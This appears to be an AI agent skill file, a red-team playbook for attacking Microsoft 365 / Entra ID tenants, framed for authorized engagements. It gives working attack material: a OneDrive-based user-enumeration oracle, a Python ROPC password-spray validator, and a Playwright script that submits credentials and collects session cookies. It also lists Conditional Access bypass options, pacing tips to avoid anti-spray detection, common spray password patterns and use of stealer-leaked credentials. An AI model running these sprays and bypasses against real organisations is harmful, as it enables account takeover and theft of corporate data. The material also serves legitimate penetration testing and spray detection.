---
name: m365-entra-attack
description: Microsoft 365 / Entra ID red-team attack chain
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: authorized-engagement, microsoft-docs, AADInternals
report_count: 1
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## When to use this skill

Trigger when:
- Target uses M365 / Entra ID (autodiscover.* records, login.microsoftonline.com redirects, "Microsoft Office 365" in tech-stack notes)
- You have a list of corporate emails or stealer-leaked creds
- Engagement involves "credential spray", "password spray", "Entra attack", "ATO via M365"
- You see `*.onmicrosoft.com`, `*-my.sharepoint.com`, `enterpriseregistration.*`, `enterpriseenrollment.*` in recon
- Client mentions "Conditional Access", "MFA bypass", "compliant device"

DO NOT use for:
- On-prem-only Active Directory (use a separate AD-attack skill)
- Service-to-service token attacks (different threat model)
- Phishing-required attack chains (covered by phishing skills) — but you can prep for the credential-validation step here

---

## Tenant discovery (msftrecon)

```bash
# For each owned domain
msftrecon -d client.example
msftrecon -d clientltd.example
msftrecon -d sister-brand-school.example
```

Key fields in output:
- **Tenant ID** (different domains may share OR have separate tenants — always test all owned domains)
- **Federation Information.Namespace Type** = `Managed` (cloud-only, ROPC works) | `Federated` (ADFS, different attack)
- **SharePoint Detected** (Yes = OneDrive enum vector available)
- **Communication Services Teams/Skype** (post-auth lateral targets)
- **Admin Consent Endpoint accessible** (consent-phishing surface)

**Red flag:** if the org has multiple Entra tenants for sister domains, each is a separate attack surface with its own user list, lockout policy, and CA configuration. Don't assume one spray covers all.

---

## AADSTS code reference (memorize)

| AADSTS | Meaning | Lockout impact | What to do |
|---|---|---|---|
| 50034 | User does not exist | None | Skip; remove from spray list |
| 50126 | Invalid username/password | +1 attempt counter | User exists — try alternate password later (within cap) |
| 50053 | Account locked (Smart Lockout) | None (already locked) | Pre-existing → flag to SOC; don't retry |
| 53003 | CA blocked token issuance | +1 attempt counter | **PASSWORD VALID** — STOP, password is correct |
| 50076 | MFA required | +1 attempt counter | **PASSWORD VALID** — second factor needed |
| 50079 | Strong auth required | +1 attempt counter | **PASSWORD VALID** — same as 50076 |
| 50158 | External auth required | +1 attempt counter | **PASSWORD VALID** — federated MFA |
| 530003 | Device-state required | +1 attempt counter | **PASSWORD VALID** — needs compliant device |
| 65001 | Consent required | +1 attempt counter | App-consent issue, not auth |
| 700016 | App not in tenant | None | User in different tenant — adjust target |
| 90002 | Tenant does not exist | None | Tenant typo / dead tenant |

**Critical insight:** any code in {53003, 50076, 50079, 50158, 530003} means **the password is correct** — Microsoft only returns these AFTER successful credential validation. Document as a confirmed-valid finding even if you can't get a token.

---

## Smart Lockout math (the cap discipline)

**Microsoft default policy:**
- 10 failed sign-ins in 10 minutes → 1-minute lockout
- 20 failed sign-ins → progressively longer lockouts (exponential backoff)
- Counter shared across **ALL auth flows** (ROPC + SAML + IMAP + EWS + SMTP + device-code)

**Engagement discipline:**
- Hard cap: ≤2 password attempts per user **lifetime per engagement** (some engagements: 1)
- State file with atomic writes — never let two test runs race the counter
- Kill switch: stop run if more than N LOCKED responses observed (suggests pre-existing attacker activity OR you miscounted; either way pause)

**Mathematical guarantee:** with 1 attempt per user, **you cannot cause Smart Lockout** (1 < 10). Any AADSTS50053 you see is therefore pre-existing → use this for active-attacker detection (see `mid-engagement-ir-detection` skill).

---

## User enumeration — vectors + hardening status (May 2026)

### ❌ HARDENED (no longer differential)

```http
GET /getuserrealm.srf?login=<email>&xml=1
```
Returns identical XML for any email matching tenant's owned domain. **Tenant-level only, not user-level.**

```http
POST /common/GetCredentialType
{"username":"<email>", "isOtherIdpSupported":true, ...}
```
Returns `AADSTS1659001` (missing flowToken) without proper session — can't enumerate.

```http
GET /autodiscover/autodiscover.json/v1.0/<email>?Protocol=AutodiscoverV1
```
Returns identical 200 + same JSON body for any address. Hardened ~2024.

### ✅ STILL WORKS (May 2026 — track shelf life)

**OneDrive personal-site differential:**
```http
GET /personal/<user>_<domain>_com/_layouts/15/onedrive.aspx HTTP/1.1
Host: <tenant>-my.sharepoint.com
```
- **302 → user EXISTS** (auth-required redirect to Authenticate.aspx)
- **404 → user does NOT exist** (404 FILE NOT FOUND)
- ZERO authentication attempt → ZERO lockout impact
- Bonus: `Sprequestduration` header faster (~40ms) for existing users vs ~600ms for non-existent — secondary timing oracle

**Caveats:**
- Only works if SharePoint is provisioned for the tenant (check msftrecon `SharePoint Detected: Yes`)
- Microsoft is hardening these endpoints over time — re-verify before relying on it
- Some users may exist in Entra without OneDrive provisioning (license-dependent) — false negatives possible

**2026-05-17 re-verification (authorized-engagement revalidation):** The OneDrive enum primitive STILL WORKS as of 2026-05-17. Calibration: licensed users return HTTP 200 with ~57KB body; nonexistent users / shared-mailbox accounts return 404 with 0 bytes. The /personal/ root path (without /_layouts/15/onedrive.aspx) returns the same differential.

**Killer use case: license differential = account-class signal.** Cross-reference OneDrive 200/404 with ROPC AADSTS50034/50126:

| OneDrive | ROPC | Classification |
|---|---|---|
| 200 | AADSTS50076 (MFA req) or 50126 | **Licensed regular user** (real employee, MFA enforced) |
| 200 | AADSTS50034 | (shouldn't happen — inconsistency, investigate) |
| 404 | AADSTS50126 | **Shared mailbox / functional / service account** (no OneDrive license, has password) — historic MFA-exempt class, prime target for password guessing |
| 404 | AADSTS50034 | Doesn't exist in tenant |
| 404 | AADSTS50076 | Edge case (functional account WITH MFA enforced — rare) |

The OneDrive-404 + ROPC-50126 combination is **the signal for "functional account that might bypass MFA"** — admins frequently exempt these from CA policies because they're used by automation that can't satisfy MFA. Discovered usefulness on authorized-engagement revalidation: identified `noreply@`, `purchase@`, `accounts@`, `postmaster@`, `transport@` as functional-account candidates (typical for any conglomerate tenant).

**ROPC AADSTS50034 / AADSTS50126 differential:**
- AADSTS50034 (user not exist) does NOT increment Smart Lockout counter
- AADSTS50126 (wrong password) DOES increment
- So a 1-attempt-per-user spray can be used as a coarse user-existence enumerator (each AADSTS50034 = miss, each AADSTS50126 = hit + 1 attempt burned)

---

## Conditional Access bypass options (most blocked, document anyway)

| Vector | Status (2026) | Notes |
|---|---|---|
| Different ROPC client_id (Microsoft Graph PowerShell vs Azure CLI vs Office) | Sometimes works | CA can be per-app; try `1b730954-1685-4b74-9bfd-dac224a7b894` (Graph PS), `04b07795-8ddb-461a-bbee-02f9e1bf7b46` (Azure CLI), `d3590ed6-52b3-4102-aeff-aad2292ab01c` (Office) |
| Different resource (graph.microsoft.com / outlook.office.com / management.azure.com) | Sometimes works | CA scope can be per-resource |
| EWS / IMAP / POP3 / SMTP Basic Auth | Mostly disabled | MS deprecated Basic Auth Oct 2022; per-account exceptions exist |
| FOCI (Family of Client IDs) | Token-refresh path | Use a refresh token from one FOCI client to mint tokens for another |
| Device-code phishing | Works | Requires user-side interaction (OOS for many engagements) |
| Compliant-device emulation | Hard | Requires Intune device registration — high effort, often impossible without insider |
| AiTM session-cookie steal | Works (with phishing) | Modern primary technique — out of scope for non-phishing engagements |
| FOCI + Family Refresh Token Theft | Post-auth | Requires already having a token |
| SAML SSO via different SP | Sometimes | Each enterprise app has its own CA policy; an app with weaker CA = pivot |
| Geo-bypass via VPN | Sometimes | If "trusted location" CA policy includes corp HQ IPs, use a VPN exit there |

**Key insight from this engagement:** in a tenant with universal CA policy (compliant device + MFA), all the above paths return AADSTS53003 with the same flow. The cred is valid, but unusable from external. **Phishing-completed cookie steal is the only realistic adversary path.** Document this clearly so the client understands the threat model.

---

## ROPC password validation (the canonical test)

**Single-attempt validator pattern (Python):**

```python
import urllib.request, urllib.parse, ssl, time, json, os
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
ATTEMPT_FILE = "engagement_log/o365_attempts.json"
HARD_CAP = 1  # or 2 — never higher

def attempt(email, password):
    state = json.load(open(ATTEMPT_FILE)) if os.path.exists(ATTEMPT_FILE) else {}
    if state.get(email.lower(), 0) >= HARD_CAP:
        return {"status": "SKIPPED_CAP"}
    body = urllib.parse.urlencode({
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Microsoft Graph PowerShell
        "client_info": "1",
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "openid",
    }).encode()
    state[email.lower()] = state.get(email.lower(), 0) + 1
    json.dump(state, open(ATTEMPT_FILE+".tmp", "w"))
    os.replace(ATTEMPT_FILE+".tmp", ATTEMPT_FILE)  # atomic
    req = urllib.request.Request(
        "https://login.microsoftonline.com/common/oauth2/token",
        data=body, method="POST",
    )
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        r = urllib.request.urlopen(req, context=ctx, timeout=15)
        body = json.loads(r.read())
        # PARSE AS JSON — see CRITICAL TRAP below about substring matching
        if "access_token" in body:    # ← JSON key check, NOT substring
            return {"status": "VALID", "body": body}
        return {"status": "STATUS_200_NO_TOKEN", "body": body}
    except urllib.error.HTTPError as e:
        msg = e.read().decode(errors="ignore")
        for code, status in [
            ("AADSTS50034", "INVALID_USER"),
            ("AADSTS50126", "INVALID_PW"),
            ("AADSTS50053", "LOCKED"),
            ("AADSTS53003", "VALID_CA_BLOCK"),
            ("AADSTS50076", "VALID_MFA"),
            ("AADSTS50079", "VALID_MFA"),
        ]:
            if code in msg:
                return {"status": status, "code": code}
        return {"status": "OTHER", "msg": msg[:200]}
```

### ⚠ CRITICAL TRAP — AADSTS50076 body contains literal `"access_token"` substring

When CA policy requires MFA and ROPC cannot satisfy it, Entra returns an error body that INCLUDES a `claims` field listing CA policy IDs as a step-up challenge:

```json
{
  "error": "invalid_grant",
  "error_description": "AADSTS50076: ...you must use multi-factor authentication...",
  "error_codes": [50076],
  "suberror": "basic_action",
  "claims": "{\"access_token\":{\"capolids\":{\"essential\":true,\"values\":[\"<policy-id-1>\",\"<policy-id-2>\"]}}}"
}
```

**The `"access_token"` substring appears inside the CA claims challenge JSON.** A loose substring check `if "access_token" in raw_body:` will false-positive every MFA-blocked attempt as a successful token issuance.

**Always parse JSON, then check `if "access_token" in parsed_dict:`** — never substring-match on OAuth error bodies. This was discovered in the 2026-05-17 authorized-engagement revalidation where a substring check produced 7 false-positive "CA bypasses" on Sway/Yammer/Bookings/Tunnel client_ids that were actually all enforcing MFA correctly.

The `claims.access_token.capolids` values are tenant-internal Conditional Access policy IDs — useful recon enrichment, but NOT a token. Document them in engagement notes as "CA policy IDs that fired" — they're a defender-side breadcrumb, not an attacker-side win.

**Pace:**
- **NEVER use concurrency. Single-threaded, serial, paced. This is a hard rule, not a tuning knob.** Entra has an IP-reputation anti-spray layer that is SEPARATE from per-user Smart Lockout. Concurrency — not attempts-per-user — is what trips it. Once tripped it returns `AADSTS50053` (LOCKED) en masse for accounts you hit only once (mathematically impossible to be real per-user locks → they are IP-level rejections), which (a) **contaminates your existence data** — 50053 is now ambiguous and you've burned the 1/user cap so you can't re-test — and (b) **flags your egress IP as a spray source** in the tenant. Observed live on an authorized engagement: switching from serial to 12 threads produced ~183 false `AADSTS50053` in 15s vs. 1 across 454 paced attempts.
- The earlier "≤30 req/sec is fine" guidance is MISLEADING for a real tenant — read it as "serial with 1.5–3s jitter," never as "parallelize up to 30/s."
- Per-user: hard cap from state file is the only thing that matters for lockout-causation; serial pacing is what matters for IP reputation.
- Random jitter (1.5–5s between attempts) for less-machine-like signature.
- **Kill-switch:** if >~5 `AADSTS50053` appear in a run where your cap is 1/user, STOP — you've either tripped IP anti-spray (your fault, pace down / rotate IP / wait for cooldown) or detected a real external spray (a finding). Either way, pause and diagnose before continuing.

---

## SAML SSO browser flow (for definitive cred validation when CA blocks ROPC)

When ROPC returns AADSTS53003, you've proven the password. To prove it across BOTH auth paths (and capture Microsoft's CA-block page as evidence), walk SAML SSO via Playwright:

```python
import asyncio
from playwright.async_api import async_playwright

async def saml_validate(target_sp_url, username, password, screenshot_dir):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--ignore-certificate-errors"])
        context = await browser.new_context(ignore_https_errors=True)
        page = await context.new_page()
        # Step 1: navigate to SP
        await page.goto(target_sp_url, wait_until="networkidle", timeout=30000)
        # Step 2: click sign-in (selectors vary per SP)
        for sel in ["button:has-text('Sign in')", "a:has-text('Login')", "button:has-text('Azure')"]:
            try:
                await page.locator(sel).first.click(timeout=3000)
                break
            except: continue
        await page.wait_for_load_state("networkidle", timeout=20000)
        # Step 3: submit username at Microsoft
        await page.locator('input[name="loginfmt"], input[type="email"]').first.fill(username)
        await page.locator('input[type="submit"], #idSIButton9').first.click()
        await page.wait_for_load_state("networkidle", timeout=20000)
        # Step 4: submit password
        await page.locator('input[name="passwd"], input[type="password"]').first.fill(password)
        await page.locator('input[type="submit"], #idSIButton9').first.click()
        await page.wait_for_load_state("networkidle", timeout=30000)
        # Step 5: capture
        await page.screenshot(path=f"{screenshot_dir}/saml_final.png", full_page=True)
        content = await page.content()
        cookies = await context.cookies()
        await browser.close()
        # Check outcome
        low = content.lower()
        if "convergedconditionalaccess" in low or "53003" in low:
            return "CA_BLOCKED"  # cred valid, CA wall
        elif "verify your identity" in low or "approve sign in" in low:
            return "MFA_REQUIRED"  # cred valid, MFA wall
        elif "we couldn't sign you in" in low or "wrong" in low:
            return "INVALID"
        elif "<post-auth-landing-marker>" in low or "dashboard" in low:
            return "FULL_SUCCESS"  # session obtained (replace marker per target app)
        return "UNCLEAR"
```

Microsoft's `ConvergedConditionalAccess` page (PageID in source) is the definitive evidence of CA-block.

---

## Active-attacker detection via lockout differential

If you see `AADSTS50053` (LOCKED) on multiple users despite your 1-attempt-per-user cap:
1. **You did not cause these locks** (math: 1 < 10).
2. **An external attacker is actively spraying the tenant.**
3. **Cluster the locked users alphabetically — if they cluster, attacker is using a sorted username list.**
4. **Diff lockout count between spray-start and spray-end** — new locks during your session = attacker is active *right now*.
5. **Document the locked email list as a finding** (SOC actionable — they pull sign-in logs for those users).

This is the **highest-impact byproduct** of any M365 spray engagement. Always track and report.

---

## Common password patterns to spray (multi-brand enterprise targets)

- `<BrandName>@<Year>` — `<Brand>@2026`, `Tata@2026`
- `<BrandName>@123` — `<Brand>@123` (very common)
- `<PlantCity>@<Year>` — `<City1>@2026`, `<City2>@2026` (production plant cities)
- `<EmployeeID-as-password>` — common in legacy apps (PAN number, employee code, phone last4)
- `Password@<year>`, `Welcome@<year>`, `Admin@<year>` — generic defaults
- `<BrandName>@<Y2-digits>` — `<Brand>@26`

**Engagement caveat:** when client provides leaked-cred dumps (stealer logs), use those FIRST. Each leaked cred is 1 cap-attempt against the strongest known guess for that user.

---

## Engagement journaling (mandatory)

Every M365 attempt logs to JSONL:
```json
{"ts":"2026-05-08T14:40:53","email":"user1@<client>.example","pw_first4":"<r4>","status":"VALID_CA_BLOCK","code":"AADSTS53003","attempts_used":1}
```

**Per-user tracker** (atomic):
```json
{"user1@<client>.example": 1, "user2@<client>.example": 1, ...}
```

**IP rotation log** (per-day):
```
2026-05-08	<src-ip>	<ISP-AS>	<operator-handle>	Round 2 spray
```

These three artifacts are deliverable evidence for the report. They survive into the next engagement as state.

---

## Real-world findings template (from authorized-engagement)

For the report:

**Finding: 261 Entra accounts in pre-existing lockout state**
- Subject: Active external password-spray campaign detected
- Evidence: `o365_results.jsonl` filtered to `status=LOCKED`
- Math: 1-attempt-per-user × 261 LOCKED ≠ our doing
- SOC action: pull sign-in logs for these 261 accounts over last 30-60 days

**Finding: Valid M365 cred — `<user>:<password>` (CA-blocked)**
- Subject: Confirmed valid credential
- Evidence: ROPC AADSTS53003 + SAML SSO `ConvergedConditionalAccess` page screenshot
- Microsoft documentation excerpt: "AADSTS53003 returned only after password validation"
- Recommendation: force password reset, audit org-wide for similar pattern

---

## Anti-patterns (don't do these)

- **DON'T use the leaked cred for the user across multiple resources** — burns the cap with no marginal benefit when CA blocks all paths
- **DON'T retry after AADSTS50053** — account is locked, you'll just see lockout again
- **DON'T parallelize ROPC/auth requests AT ALL** — serial + paced only. Concurrency trips Entra's IP-reputation anti-spray (separate from Smart Lockout), floods false `AADSTS50053`, contaminates results, and flags your IP. "Going faster" by adding threads costs more than it saves. The only safe speed-up is removing dead/nonexistent users first (small `GetCredentialType` batches <60), not raising concurrency.
- **DON'T forget to test ALL Entra tenants** — sister domains often have separate tenants with different password policies
- **DON'T retract a CA-block finding** — AADSTS53003 means the password is correct; that's the whole point

---

## Tooling

```bash
pip install --break-system-packages msftrecon o365spray  # may need to clone msftrecon from GitHub
brew install pandoc                                       # for report generation
go install -v github.com/projectdiscovery/...             # PD toolkit for general recon
```

Pre-built `m365_validator.py` template at engagement working directory `engagement_log/m365_validator.py`. Adapt the `attempt()` function to your engagement.

---

## Related Skills & Chains

- **`hunt-mfa-bypass`** — AADSTS50053 (lockout) vs AADSTS50126 (bad password) vs AADSTS50076 (MFA required) is a free factor-presence oracle. Chain primitive: M365 AADSTS50053 lockout differential observed → user has MFA but no CA enforcement on legacy auth → `hunt-mfa-bypass` factor-probe (SMS fallback, voice fallback, OAuth device-code flow, ROPC against legacy endpoint) → Conditional Access bypass via legacy-protocol path.
- **`hunt-ntlm-info`** — On-prem NTLM topology leak feeds the Entra spray. Chain primitive: SharePoint/Exchange/IIS anon NTLM Type-2 → AV_PAIR decode yields `corp.example.com` → `m365-entra-attack` resolves Entra tenant via openid-configuration → ROPC spray with realistic UPN format.
- **`okta-attack`** — Hybrid orgs run Okta-as-IdP federated into Entra. Chain primitive: M365 `getuserrealm` returns `NameSpaceType: Federated` with AuthURL pointing to `*.okta.com` → pivot to `okta-attack` for tenant enumeration → Okta ATO → SAML assertion to Entra → full M365 access.
- **`hunt-saml`** — Federated tenants accept signed SAML assertions; XSW or signature-stripping on the federated IdP bypasses Entra's controls entirely. Chain primitive: `getuserrealm` reveals federation → IdP fingerprinted (ADFS / Okta / PingFederate) → `hunt-saml` XSW1-XSW8 against IdP's `/adfs/ls/` or equivalent → forged assertion → Entra grants access.
- **`redteam-report-template`** — M365 findings need clear tenant/user/CA-policy framing because the blast radius is "every Microsoft service the org uses." Chain primitive: validated finding from this skill → run through `triage-validation` 7-Question Gate → package via `redteam-report-template` with explicit blast-radius (which apps, which users, which data) for client deliverable.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
